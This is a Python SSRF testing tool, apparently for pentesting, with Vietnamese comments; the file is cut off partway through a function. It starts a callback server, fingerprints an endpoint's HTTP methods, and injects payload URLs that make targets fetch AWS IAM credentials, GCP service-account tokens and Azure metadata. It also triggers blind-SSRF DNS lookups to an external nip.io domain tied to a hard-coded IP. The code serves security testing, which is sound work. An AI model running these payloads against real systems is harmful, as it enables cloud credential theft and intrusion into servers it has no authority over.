"""
External Callback Detector
Sử dụng callback server để confirm SSRF 100%
"""

import requests
import time
import socket
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Dict, List, Optional
from datetime import datetime
from queue import Queue
import uuid
import logging
import sqlite3
import json
import os

logger = logging.getLogger(__name__)

class CallbackHandler(BaseHTTPRequestHandler):
    """HTTP Request Handler để nhận callbacks"""
    
    # Shared queue để lưu callbacks
    callback_queue = Queue()
    
    def do_GET(self):
        self._handle_request('GET')
    
    def do_POST(self):
        self._handle_request('POST')
    
    def do_DELETE(self):
        self._handle_request('DELETE')
    
    def do_PUT(self):
        self._handle_request('PUT')
    
    def _handle_request(self, method: str):
        """Handle bất kỳ HTTP method nào"""
        # Lấy request details
        client_ip = self.client_address[0]
        
        # ⚠️ Với ngrok/proxy, phải check X-Forwarded-For để lấy IP thật
        forwarded_for = self.headers.get('X-Forwarded-For')
        real_ip = forwarded_for.split(',')[0].strip() if forwarded_for else client_ip
        
        # Check xem có phải từ localhost không
        is_local = real_ip in ['127.0.0.1', '::1', 'localhost'] or real_ip.startswith('192.168.') or real_ip.startswith('10.') or real_ip.startswith('172.')
        
        # ✅ Xác định SSRF: Request từ IP PUBLIC, không phải localhost/private IP
        is_ssrf_candidate = not is_local
        
        callback_data = {
            'timestamp': datetime.now().isoformat(),
            'method': method,
            'path': self.path,
            'headers': dict(self.headers),
            'client_address': client_ip,
            'real_ip': real_ip,
            'client_port': self.client_address[1],
            'is_local': is_local,
            'is_ssrf': is_ssrf_candidate,
            'analysis': '⚠️ LOCAL/PRIVATE (your network)' if is_local else '✅ PUBLIC IP (potential SSRF!)'
        }
        
        # Print callback info to console for debugging
        print(f"\n{'='*60}")
        print(f"📞 CALLBACK RECEIVED!")
        print(f"Time: {callback_data['timestamp']}")
        print(f"From: {client_ip}:{self.client_address[1]}")
        if real_ip != client_ip:
            print(f"Real IP (via X-Forwarded-For): {real_ip}")
        print(f"Status: {callback_data['analysis']}")
        print(f"🎯 SSRF Detected: {'YES ✅' if is_ssrf_candidate else 'NO ❌ (local/test request)'}")
        print(f"Method: {method}")
        print(f"Path: {self.path}")
        print(f"User-Agent: {self.headers.get('User-Agent', 'N/A')}")
        print(f"{'='*60}\n")
        
        # Read body nếu có
        content_length = self.headers.get('Content-Length')
        if content_length:
            body = self.rfile.read(int(content_length))
            callback_data['body'] = body.decode('utf-8', errors='ignore')
        
        # Add to queue
        self.callback_queue.put(callback_data)
        
        # ✅ ENHANCED: HTML response với callback details
        if self.path == '/' or self.path == '':
            # Root path - show welcome page
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>SSRF Callback Server</title>
    <style>
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background: #f5f5f5;
        }}
        .container {{
            background: white;
            border-radius: 8px;
            padding: 30px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
        h1 {{
            color: #2c3e50;
            border-bottom: 3px solid #3498db;
            padding-bottom: 10px;
        }}
        .status {{
            background: #2ecc71;
            color: white;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
        }}
        .info {{
            background: #ecf0f1;
            padding: 15px;
            border-radius: 5px;
            margin: 10px 0;
        }}
        .code {{
            background: #2c3e50;
            color: #2ecc71;
            padding: 15px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            overflow-x: auto;
            margin: 10px 0;
        }}
        .warning {{
            background: #f39c12;
            color: white;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }}
        th, td {{
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }}
        th {{
            background: #3498db;
            color: white;
        }}
        .label {{
            font-weight: bold;
            color: #2c3e50;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🎯 SSRF Callback Server</h1>
        
        <div class="status">
            ✅ <strong>Server Status:</strong> RUNNING
        </div>
        
        <div class="info">
            <p class="label">📡 Callback Endpoint:</p>
            <div class="code">http://localhost:{self.server.server_port}/your-test-id-here</div>
        </div>
        
        <div class="warning">
            ⚠️ <strong>Note:</strong> Bạn đang truy cập trực tiếp qua browser. 
            Đây KHÔNG phải SSRF callback, chỉ là browser request thông thường.
        </div>
        
        <h2>📖 How to Use</h2>
        <table>
            <tr>
                <th>Step</th>
                <th>Action</th>
            </tr>
            <tr>
                <td>1️⃣</td>
                <td>Generate unique test ID: <code>test_12345</code></td>
            </tr>
            <tr>
                <td>2️⃣</td>
                <td>Send SSRF payload with callback URL:<br>
                    <code>http://your-ip:{self.server.server_port}/test_12345</code>
                </td>
            </tr>
            <tr>
                <td>3️⃣</td>
                <td>Wait for target server to make request to callback URL</td>
            </tr>
            <tr>
                <td>4️⃣</td>
                <td>Check if callback with <code>test_12345</code> received → SSRF confirmed!</td>
            </tr>
        </table>
        
        <h2>📊 Recent Request (This One)</h2>
        <div class="info">
            <p><strong>Method:</strong> {method}</p>
            <p><strong>Path:</strong> {self.path}</p>
            <p><strong>Client:</strong> {self.client_address[0]}:{self.client_address[1]}</p>
            <p><strong>User-Agent:</strong> {self.headers.get('User-Agent', 'N/A')}</p>
            <p><strong>Time:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
        
        <h2>🔥 Example SSRF Payloads</h2>
        <div class="code">
# GET with query parameter
http://target.com/api/fetch?url=http://localhost:{self.server.server_port}/test1

# POST with JSON
POST http://target.com/api/check_price
{{"compare_url": "http://localhost:{self.server.server_port}/test2"}}

# POST with form data
POST http://target.com/api/callback
callback_url=http://localhost:{self.server.server_port}/test3
        </div>
        
        <p style="text-align: center; color: #7f8c8d; margin-top: 40px;">
            💡 Tip: Use Web UI at <a href="http://localhost:5000">http://localhost:5000</a> for automated testing
        </p>
    </div>
</body>
</html>
            """
            self.wfile.write(html.encode('utf-8'))
        else:
            # Non-root path - potential SSRF callback
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Callback Received</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
            background: #2c3e50;
            color: #ecf0f1;
        }}
        .success {{
            background: #27ae60;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            margin-bottom: 20px;
        }}
        .details {{
            background: #34495e;
            padding: 20px;
            border-radius: 5px;
        }}
        pre {{
            background: #1a1a1a;
            color: #2ecc71;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
        }}
    </style>
</head>
<body>
    <div class="success">
        <h1>✅ Callback Received!</h1>
        <p>SSRF vulnerability may be confirmed if this is from target server.</p>
    </div>
    <div class="details">
        <h2>📡 Request Details:</h2>
        <pre>Method:  {method}
Path:    {self.path}
From:    {self.client_address[0]}:{self.client_address[1]}
Time:    {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

User-Agent: {self.headers.get('User-Agent', 'N/A')}
Host: {self.headers.get('Host', 'N/A')}
</pre>
    </div>
</body>
</html>
            """
            self.wfile.write(html.encode('utf-8'))
    
    def log_message(self, format, *args):
        """Suppress default logging"""
        pass

class CallbackServer:
    """HTTP Server để nhận SSRF callbacks"""
    
    def __init__(self, host: str = '0.0.0.0', port: int = 8888):
        self.host = host
        self.port = port
        self.server = None
        self.thread = None
        self.is_running = False
        self.callbacks = []
        self._callback_addresses = []  # Store possible callback addresses
        self.db_path = 'tools/callbacks.db'  # Database path for checking callbacks
    
    def start(self) -> str:
        """Start callback server"""
        if self.is_running:
            return f"http://{self.host}:{self.port}"
        
        self.server = HTTPServer((self.host, self.port), CallbackHandler)
        self.thread = threading.Thread(target=self.server.serve_forever)
        self.thread.daemon = True
        self.thread.start()
        self.is_running = True
        
        print(f"[+] Callback server started on {self.host}:{self.port}")
        return f"http://{self.host}:{self.port}"
    
    def stop(self):
        """Stop callback server"""
        if self.server:
            self.server.shutdown()
            self.is_running = False
            print("[+] Callback server stopped")
    
    def get_callbacks(self, timeout: int = 5) -> List[Dict]:
        """Lấy callbacks đã nhận được"""
        callbacks = []
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            try:
                callback = CallbackHandler.callback_queue.get(timeout=0.1)
                callbacks.append(callback)
                self.callbacks.append(callback)
            except:
                continue
        
        return callbacks
    
    def clear_callbacks(self):
        """Clear callback queue and stored callbacks"""
        while not CallbackHandler.callback_queue.empty():
            try:
                CallbackHandler.callback_queue.get_nowait()
            except:
                break
        self.callbacks.clear()
    
    def get_all_callback_addresses(self) -> list:
        """Get all possible callback addresses to try"""
        import socket
        import platform
        
        addresses = []
        
        # Strategy 1: host.docker.internal (Docker Desktop - Windows/Mac)
        if platform.system() in ['Windows', 'Darwin']:
            addresses.append('host.docker.internal')
        
        # Strategy 2: Docker bridge gateway (Linux)
        # Common Docker bridge IPs
        addresses.append('172.17.0.1')  # Default Docker bridge
        addresses.append('172.18.0.1')  # Custom Docker networks
        
        # Strategy 3: Get actual local IP (all interfaces)
        try:
            # Primary network interface
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            if local_ip not in addresses:
                addresses.append(local_ip)
        except:
            pass
        
        # Try to get all network interfaces
        try:
            hostname = socket.gethostname()
            all_ips = socket.gethostbyname_ex(hostname)[2]
            for ip in all_ips:
                if ip not in addresses and not ip.startswith('127.'):
                    addresses.append(ip)
        except:
            pass
        
        # Strategy 4: localhost variants (last resort)
        addresses.append('localhost')
        addresses.append('127.0.0.1')
        
        # Strategy 5: IPv6 localhost (some services might support)
        addresses.append('[::1]')
        addresses.append('::1')
        
        # Remove duplicates while preserving order
        seen = set()
        unique_addresses = []
        for addr in addresses:
            if addr not in seen:
                seen.add(addr)
                unique_addresses.append(addr)
        
        return unique_addresses
    
    def warm_up_ngrok_url(self, ngrok_url: str) -> bool:
        """
        🔥 Check if ngrok URL has warning page
        
        Ngrok free plan hiển thị warning page cho first-time visitors.
        Function này kiểm tra xem URL có accessible không.
        
        Returns:
            bool: True nếu URL accessible (no warning), False nếu có warning page
        """
        try:
            logger.info(f"🔥 Checking ngrok URL accessibility: {ngrok_url}")
            
            # Test request to check accessibility
            response = requests.get(
                f"{ngrok_url}/warmup_test",
                timeout=10,
                allow_redirects=True,
                verify=False
            )
            
            content_len = len(response.text)
            
            # Ngrok warning page is typically 2000-3000 bytes HTML
            if content_len > 1000 and response.status_code == 200:
                content_lower = response.text.lower()
                if 'ngrok' in content_lower or 'interstitial' in content_lower:
                    logger.warning("⚠️  Ngrok warning/interstitial page detected!")
                    logger.warning(f"    Page size: {content_len} bytes")
                    logger.warning("    ")
                    logger.warning("    🔧 SOLUTIONS:")
                    logger.warning("    1. Visit ngrok URL in browser → Click 'Visit Site'")
                    logger.warning("    2. Use paid ngrok plan (no warning page)")
                    logger.warning("    3. Use alternative tunnel (serveo, localhost.run)")
                    logger.warning("    ")
                    logger.warning("    📖 See NGROK_SOLUTIONS.md for detailed guide")
                    return False
            
            # Small response = callback server response
            if response.status_code == 200 and content_len <= 100:
                logger.info(f"✅ Ngrok URL accessible! (response: {content_len} bytes)")
                return True
            
            # Other responses - might be OK
            logger.info(f"✅ URL responding (status: {response.status_code}, size: {content_len})")
            return True
                
        except requests.exceptions.RequestException as e:
            logger.error(f"❌ Failed to test ngrok URL: {e}")
            return False
        except Exception as e:
            logger.error(f"❌ Warmup error: {e}")
            return False
    
    def check_callback_received(self, path: str, timeout: int = 10) -> bool:
        """
        Check if a specific HTTP callback was received
        
        Args:
            path: The expected path (e.g., "/ssrf_test_1_compare_url")
            timeout: How long to wait for the callback (default 10s for ngrok + remote targets)
        
        Returns:
            True if callback was received, False otherwise
        """
        start_time = time.time()
        
        # First, check existing callbacks in memory
        for callback in self.callbacks:
            if callback.get('path', '').startswith(path):
                return True
        
        # Wait for new callbacks (check both queue and database)
        last_db_check = 0
        while time.time() - start_time < timeout:
            # Check queue first (fast)
            try:
                callback = CallbackHandler.callback_queue.get(timeout=0.1)
                self.callbacks.append(callback)
                
                # Check if this is the callback we're looking for
                if callback.get('path', '').startswith(path):
                    return True
                    
            except:
                pass
            
            # Also check database every 0.5s (in case callback was saved but not queued yet)
            current_time = time.time()
            if current_time - last_db_check >= 0.5:
                last_db_check = current_time
                try:
                    logger.debug(f"🔍 Checking HTTP callback database for path: {path}")
                    conn = sqlite3.connect(self.db_path)
                    cursor = conn.cursor()
                    cursor.execute(
                        "SELECT * FROM callbacks WHERE path LIKE ? ORDER BY id DESC LIMIT 10",
                        (f"{path}%",)
                    )
                    rows = cursor.fetchall()
                    conn.close()
                    
                    logger.debug(f"🔍 Database returned {len(rows)} rows")
                    if rows:
                        logger.info(f"✅ Found HTTP callback in database: {rows[0][3]}")  # path is 4th column
                        return True
                except Exception as e:
                    logger.error(f"❌ Database check error: {e}")
                    pass
            
            time.sleep(0.1)  # Small delay between checks
                
        return False
    
    def check_dns_callback_received(self, domain_pattern: str, timeout: int = 10) -> bool:
        """
        Check if a specific DNS callback was received
        
        Args:
            domain_pattern: The expected domain pattern (e.g., "ssrf-test-abc123")
            timeout: How long to wait for the DNS callback (default 10s)
        
        Returns:
            True if DNS callback was received, False otherwise
        """
        start_time = time.time()
        
        logger.info(f"🔍 Waiting for DNS callback: {domain_pattern}")
        
        # Poll database every 0.5s for DNS callbacks
        last_db_check = 0
        while time.time() - start_time < timeout:
            current_time = time.time()
            if current_time - last_db_check >= 0.5:
                last_db_check = current_time
                try:
                    logger.debug(f"🔍 Checking DNS callback database for domain: {domain_pattern}")
                    conn = sqlite3.connect(self.db_path)
                    cursor = conn.cursor()
                    # Schema: (id, timestamp, domain, query_type, client_ip, raw_query, created_at)
                    cursor.execute(
                        "SELECT * FROM dns_callbacks WHERE domain LIKE ? ORDER BY id DESC LIMIT 10",
                        (f"%{domain_pattern}%",)
                    )
                    rows = cursor.fetchall()
                    conn.close()
                    
                    logger.debug(f"🔍 DNS database returned {len(rows)} rows")
                    if rows:
                        # rows format: (id, timestamp, domain, query_type, client_ip, raw_query, created_at)
                        logger.info(f"✅ Found DNS callback: {rows[0][2]} from {rows[0][4]}")
                        return True
                except Exception as e:
                    logger.error(f"❌ DNS database check error: {e}")
                    pass
            
            time.sleep(0.1)  # Small delay between checks
        
        logger.warning(f"⏱️ DNS callback timeout: No DNS query for {domain_pattern} within {timeout}s")
        return False
    
    def get_callback_url(self, path: str = '', address: str = None) -> str:
        """
        Lấy URL để test SSRF
        
        Args:
            path: URL path
            address: Specific address to use (if None, auto-detect)
        """
        if address:
            return f"http://{address}:{self.port}{path}"
        
        # Auto-detect best address
        if not self._callback_addresses:
            self._callback_addresses = self.get_all_callback_addresses()
        
        # Return first address (usually host.docker.internal or actual IP)
        return f"http://{self._callback_addresses[0]}:{self.port}{path}"

class ExternalCallbackDetector:
    """Detector sử dụng external callback"""
    
    def __init__(self, callback_server: Optional[CallbackServer] = None):
        self.callback_server = callback_server
        self.session = requests.Session()
        self.test_results = []
    
    def _extract_searchable_text(self, response_text: str) -> str:
        """
        Extract searchable text from response
        Handles both plain text and JSON responses with nested content
        """
        searchable_text = response_text
        
        # Try to parse as JSON and extract common content fields
        try:
            data = json.loads(response_text)
            if isinstance(data, dict):
                # Common fields that might contain fetched content
                content_fields = [
                    'content', 'content_preview', 'body', 'text', 'data',
                    'response', 'result', 'output', 'html', 'page_content'
                ]
                
                # Extract all matching fields
                extracted = []
                for field in content_fields:
                    if field in data:
                        value = data[field]
                        if isinstance(value, str):
                            extracted.append(value)
                        elif value:
                            extracted.append(str(value))
                
                # If we found content fields, use them; otherwise use full JSON
                if extracted:
                    searchable_text = ' '.join(extracted)
                else:
                    searchable_text = json.dumps(data)
        except (json.JSONDecodeError, ValueError):
            # Not JSON, use original text
            pass
        
        return searchable_text
    
    def _get_custom_headers(self) -> Dict[str, str]:
        """
        Get custom HTTP headers from environment variable
        Format: CUSTOM_HEADERS=Header1: Value1 | Header2: Value2
        """
        custom_headers = {}
        
        # Try to read from environment
        env_headers = os.getenv('CUSTOM_HEADERS', '')
        
        # If not in env, try to read from .env file directly
        if not env_headers:
            try:
                env_file = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), '.env')
                if os.path.exists(env_file):
                    with open(env_file, 'r', encoding='utf-8') as f:
                        for line in f:
                            line = line.strip()
                            if line.startswith('CUSTOM_HEADERS='):
                                env_headers = line.split('=', 1)[1]
                                break
            except Exception as e:
                print(f"Warning: Could not read .env file: {e}")
        
        if env_headers:
            # Split by | for multiple headers
            for header_str in env_headers.split('|'):
                header_str = header_str.strip()
                if ':' in header_str:
                    name, value = header_str.split(':', 1)
                    custom_headers[name.strip()] = value.strip()
        
        return custom_headers
    
    def detect_endpoint_methods(self, target_url: str, timeout: int = 5) -> Dict:
        """
        Detect supported HTTP methods WITHOUT using OPTIONS
        Thử trực tiếp các methods phổ biến và analyze response
        
        Returns:
            {
                'supported_methods': ['GET', 'POST', ...],
                'content_type': 'json' | 'form' | 'unknown',
                'status_codes': {'GET': 200, 'POST': 201, ...},
                'details': {...}
            }
        """
        print(f"\n[*] 🔍 Detecting supported HTTP methods for: {target_url}")
        print(f"[*] Testing common methods: GET, POST, PUT, DELETE, PATCH...\n")
        
        supported_methods = []
        status_codes = {}
        content_type = 'unknown'
        allow_header = None
        
        test_methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD']
        
        for method in test_methods:
            try:
                # Prepare minimal request
                kwargs = {
                    'timeout': timeout,
                    'allow_redirects': False,
                    'headers': {
                        'User-Agent': 'Mozilla/5.0 (SSRF-Test)',
                        'Accept': 'application/json, text/html, */*'
                    }
                }
                
                # Add empty body for POST/PUT/PATCH
                if method in ['POST', 'PUT', 'PATCH']:
                    kwargs['json'] = {}  # Try JSON first
                
                # Send request
                response = self.session.request(method, target_url, **kwargs)
                status_codes[method] = response.status_code
                
                # ✅ FIX: Method is supported ONLY if:
                # 1. Status code is successful (200-399) - endpoint exists and accepts method
                # 2. NOT 404 (Not Found) - endpoint doesn't exist
                # 3. NOT 405 (Method Not Allowed) - endpoint exists but method not allowed
                # 4. NOT 501 (Not Implemented) - method not implemented
                if 200 <= response.status_code < 400:
                    supported_methods.append(method)
                    print(f"    ✅ {method:6} - Status {response.status_code} - SUPPORTED")
                    
                    # Detect content-type from response
                    resp_content_type = response.headers.get('content-type', '').lower()
                    if 'application/json' in resp_content_type:
                        content_type = 'json'
                    elif 'application/x-www-form-urlencoded' in resp_content_type:
                        content_type = 'form'
                elif response.status_code == 404:
                    print(f"    ⚠️  {method:6} - Status {response.status_code} - ENDPOINT NOT FOUND")
                elif response.status_code in [405, 501]:
                    print(f"    ❌ {method:6} - Status {response.status_code} - METHOD NOT ALLOWED")
                else:
                    print(f"    ❌ {method:6} - Status {response.status_code} - ERROR/UNAUTHORIZED")
                    
                    # Check Allow header
                    if response.status_code == 405:
                        allow_header = response.headers.get('Allow', '')
                
            except requests.exceptions.Timeout:
                print(f"    ⏱️  {method:6} - TIMEOUT")
                status_codes[method] = 'timeout'
            except Exception as e:
                print(f"    ⚠️  {method:6} - ERROR: {str(e)[:50]}")
                status_codes[method] = f'error: {str(e)[:30]}'
        
        # Parse Allow header if available
        if allow_header and not supported_methods:
            print(f"\n[*] 📋 Allow header found: {allow_header}")
            allowed_methods = [m.strip().upper() for m in allow_header.split(',')]
            supported_methods.extend(allowed_methods)
        
        # ✅ FIX: If no methods detected, check if endpoint exists at all
        if not supported_methods:
            # Check if ALL methods returned 404 - endpoint doesn't exist
            all_404 = all(status_codes.get(m) == 404 for m in test_methods if m in status_codes)
            if all_404:
                print(f"\n[!] ❌ ENDPOINT NOT FOUND - All methods returned 404")
                print(f"[!] ⚠️  This endpoint does not exist, skipping SSRF tests")
            else:
                print(f"\n[!] ⚠️  No methods explicitly supported, assuming GET")
                supported_methods = ['GET']
        
        result = {
            'target_url': target_url,
            'supported_methods': supported_methods,
            'content_type': content_type,
            'status_codes': status_codes,
            'allow_header': allow_header,
            'timestamp': datetime.now().isoformat()
        }
        
        print(f"\n[+] ✅ Detection complete:")
        print(f"    Supported methods: {', '.join(supported_methods)}")
        print(f"    Content-Type: {content_type}")
        print()
        
        return result
    
    def test_cloud_metadata(self, target_url: str, parameter: str, 
                            method: str = 'POST', timeout: int = 10) -> Dict:
        """
        Test SSRF với cloud metadata endpoints (AWS, GCP, Azure)
        Không cần callback server - detect bằng response content
        
        Returns:
            Dict với kết quả test cho từng cloud provider
        """
        # Get custom headers from env (e.g., Authorization)
        custom_headers = self._get_custom_headers()
        
        print(f"\n[*] ☁️  Testing Cloud Metadata SSRF on {target_url}")
        print(f"[*] Parameter: {parameter}, Method: {method}")
        if custom_headers:
            print(f"[+] 🔐 Using {len(custom_headers)} custom header(s): {', '.join(custom_headers.keys())}")
        else:
            print(f"[!] ⚠️  WARNING: No Authorization header found!")
            print(f"[!] ⚠️  Endpoint may require authentication - check CUSTOM_HEADERS in .env")
        
        # Cloud metadata endpoints
        cloud_payloads = [
            {
                'name': 'AWS Metadata',
                'url': 'http://169.254.169.254/latest/meta-data/',
                'indicators': ['ami-id', 'instance-id', 'hostname', 'placement']
            },
            {
                'name': 'AWS IAM Credentials',
                'url': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'indicators': ['AccessKeyId', 'SecretAccessKey', 'Token']
            },
            {
                'name': 'AWS User Data',
                'url': 'http://169.254.169.254/latest/user-data/',
                'indicators': ['#!/bin/', 'password', 'secret', 'key']
            },
            {
                'name': 'GCP Metadata',
                'url': 'http://metadata.google.internal/computeMetadata/v1/',
                'indicators': ['instance/', 'project/', 'oslogin']
            },
            {
                'name': 'GCP Service Account Token',
                'url': 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
                'indicators': ['access_token', 'expires_in', 'token_type']
            },
            {
                'name': 'Azure Metadata',
                'url': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
                'indicators': ['compute', 'vmId', 'subscriptionId']
            },
            {
                'name': 'Docker Metadata',
                'url': 'http://172.17.0.1',
                'indicators': ['docker', 'container']
            }
        ]
        
        results = []
        vulnerable_payloads = []
        
        for payload in cloud_payloads:
            print(f"\\n[*] Testing {payload['name']}...")
            print(f"    Payload: {payload['url']}")
            
            try:
                headers = {
                    'ngrok-skip-browser-warning': 'true',
                    'User-Agent': 'Mozilla/5.0 (SSRF-Test)'
                }
                
                # Add custom headers (Authorization, etc.)
                headers.update(custom_headers)
                
                # Send request with cloud metadata URL
                if method.upper() == 'GET':
                    test_url = f"{target_url}?{parameter}={payload['url']}"
                    response = self.session.get(test_url, timeout=timeout, headers=headers)
                elif method.upper() == 'POST':
                    headers['Content-Type'] = 'application/json'
                    response = self.session.post(
                        target_url,
                        json={parameter: payload['url']},
                        timeout=timeout,
                        headers=headers
                    )
                else:
                    headers['Content-Type'] = 'application/json'
                    response = self.session.request(
                        method.upper(),
                        target_url,
                        json={parameter: payload['url']},
                        timeout=timeout,
                        headers=headers
                    )
                
                response_text = response.text
                
                # Extract searchable text (handles JSON with nested content)
                searchable_text = self._extract_searchable_text(response_text)
                searchable_lower = searchable_text.lower()
                
                # Check if response contains cloud metadata indicators
                found_indicators = [ind for ind in payload['indicators'] if ind.lower() in searchable_lower]
                is_vulnerable = len(found_indicators) > 0
                
                result = {
                    'payload_name': payload['name'],
                    'payload_url': payload['url'],
                    'is_vulnerable': is_vulnerable,
                    'status_code': response.status_code,
                    'response_length': len(response_text),
                    'found_indicators': found_indicators,
                    'response_preview': response_text[:500] if is_vulnerable else None,
                    'searchable_content': searchable_text[:200] if is_vulnerable else None
                }
                
                results.append(result)
                
                if is_vulnerable:
                    vulnerable_payloads.append(payload['name'])
                    print(f"    ✅ VULNERABLE! Found indicators: {', '.join(found_indicators)}")
                    print(f"    Response preview: {response_text[:200]}...")
                else:
                    print(f"    ❌ Not vulnerable (no metadata found)")
                    
            except Exception as e:
                print(f"    ⚠️  Error: {str(e)}")
                results.append({
                    'payload_name': payload['name'],
                    'payload_url': payload['url'],
                    'is_vulnerable': False,
                    'error': str(e)
                })
        
        summary = {
            'target_url': target_url,
            'parameter': parameter,
            'method': method,
            'total_payloads': len(cloud_payloads),
            'vulnerable_payloads': len(vulnerable_payloads),
            'is_vulnerable': len(vulnerable_payloads) > 0,
            'vulnerable_clouds': vulnerable_payloads,
            'results': results,
            'timestamp': datetime.now().isoformat()
        }
        
        print(f"\\n{'='*60}")
        print(f"☁️  CLOUD METADATA TEST SUMMARY")
        print(f"{'='*60}")
        print(f"Target: {target_url}")
        print(f"Vulnerable payloads: {len(vulnerable_payloads)}/{len(cloud_payloads)}")
        if vulnerable_payloads:
            print(f"✅ SSRF CONFIRMED via: {', '.join(vulnerable_payloads)}")
        else:
            print(f"❌ No cloud metadata SSRF detected")
        print(f"{'='*60}\\n")
        
        return summary
    
    def test_blind_ssrf_dns(self, target_url: str, parameter: str,
                            method: str = 'POST', timeout: int = 10) -> Dict:
        """
        Test Blind SSRF bằng DNS callback (không cần HTTP response)
        
        Kỹ thuật này hữu ích khi:
        - Application không trả về fetched content
        - Firewall chặn HTTP outbound nhưng cho phép DNS
        - Cần stealth testing (DNS ít bị monitor hơn HTTP)
        
        Returns:
            Dict với kết quả test và DNS callback data
        """
        if not self.callback_server:
            return {'error': 'No callback server configured'}
        
        # Get DNS server config from env
        dns_server_ip = os.getenv('DNS_SERVER_IP', '40.82.145.240')
        
        # Generate unique test ID
        test_id = str(uuid.uuid4())[:8]
        dns_domain = f"ssrf-test-{test_id}.{dns_server_ip}.nip.io"
        
        print(f"\n[*] 🧪 Testing Blind SSRF via DNS on {target_url}")
        print(f"[*] Parameter: {parameter}, Method: {method}")
        print(f"[*] DNS domain: {dns_domain}")
        
        # Get custom headers from env (Authorization, etc.)
        custom_headers = self._get_custom_headers()
        
        # Send SSRF payload with DNS domain
        try:
            headers = {
                'ngrok-skip-browser-warning': 'true',
                'User-Agent': 'Mozilla/5.0 (SSRF-Test)'
            }
            headers.update(custom_headers)
            
            # Construct payload URL (e.g., http://ssrf-test-abc123.40.82.145.240.nip.io)
            payload_url = f"http://{dns_domain}"
            
            if method.upper() == 'GET':
                test_url = f"{target_url}?{parameter}={payload_url}"
                response = self.session.get(test_url, timeout=timeout, headers=headers)
            elif method.upper() == 'POST':
                headers['Content-Type'] = 'application/json'
                response = self.session.post(
                    target_url,
                    json={parameter: payload_url},
                    timeout=timeout,
                    headers=headers
                )
            else:
                headers['Content-Type'] = 'application/json'
                response = self.session.request(
                    method.upper(),
                    target_url,
                    json={parameter: payload_url},
                    timeout=timeout,
                    headers=headers
                )
            
            initial_response = {
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'content_length': len(response.content),
                'response_time': response.elapsed.total_seconds()
            }
            
            print(f"[+] Request sent successfully (status {response.status_code})")
            
        except Exception as e:
            print(f"[!] Request error: {str(e)}")
            initial_response = {'error': str(e)}
        
        # Wait for DNS callback
        print(f"[*] ⏳ Waiting for DNS callback (timeout: {timeout}s)...")
        
        dns_received = self.callback_server.check_dns_callback_received(
            domain_pattern=f"ssrf-test-{test_id}",
            timeout=timeout
        )
        
        # Build result
        result = {
            'target_url': target_url,
            'parameter': parameter,
            'method': method,
            'test_type': 'blind_ssrf_dns',
            'dns_domain': dns_domain,
            'test_id': test_id,
            'is_vulnerable': dns_received,
            'initial_response': initial_response,
            'timestamp': datetime.now().isoformat()
        }
        
        if dns_received:
            print(f"\n[+] ✅ BLIND SSRF CONFIRMED via DNS!")
            print(f"[+] 🎯 DNS query received for: {dns_domain}")
            print(f"[!] 🔥 This confirms:")
            print(f"[!]    - Server CAN make DNS queries to external domains")
            print(f"[!]    - Application is vulnerable to Blind SSRF")
            print(f"[!]    - Even without HTTP response, attacker can:")
            print(f"[!]      • Exfiltrate data via DNS queries")
            print(f"[!]      • Scan internal network (if DNS resolution works)")
            print(f"[!]      • Detect firewall rules (DNS vs HTTP blocking)")
        else:
            print(f"\n[-] ❌ No DNS callback received")
            print(f"[!] Possible reasons:")
            print(f"[!]    - Application doesn't resolve external domains")
            print(f"[!]    - DNS queries are blocked by firewall")
            print(f"[!]    - Parameter is validated/sanitized")
            print(f"[!]    - Application uses internal DNS only")
        
        self.test_results.append(result)
        return result
    
    def test_ssrf(self, target_url: str, parameter: str, 
                  method: str = 'GET', timeout: int = 10) -> Dict:
        """
        Test SSRF bằng callback method - tries multiple callback addresses
        
        Returns:
            Dict với kết quả test và callback data
        """
        if not self.callback_server:
            return {'error': 'No callback server configured'}
        
        # Get all possible callback addresses
        addresses = self.callback_server.get_all_callback_addresses()
        
        print(f"[*] Testing SSRF on {target_url}")
        print(f"[*] Will try {len(addresses)} callback addresses: {', '.join(addresses)}")
        
        # Try each address
        all_attempts = []
        total_callbacks = 0
        
        for address in addresses:
            # Generate unique path để track request này
            test_id = str(uuid.uuid4())[:8]
            callback_path = f"/ssrf-test-{test_id}"
            callback_url = self.callback_server.get_callback_url(callback_path, address=address)
            
            print(f"[*] Trying callback URL: {callback_url}")
            
            # DON'T clear callbacks - we want to check if any arrived
            # (Target might be slow to fetch)
            
            # Send SSRF payload
            try:
                # ✅ Add ngrok bypass header (để bypass "visit site" barrier)
                headers = {
                    'ngrok-skip-browser-warning': 'true',
                    'User-Agent': 'Mozilla/5.0 (SSRF-Test)'
                }
                
                # Add custom headers from env (Authorization, etc.)
                custom_headers = self._get_custom_headers()
                headers.update(custom_headers)
                
                if method.upper() == 'GET':
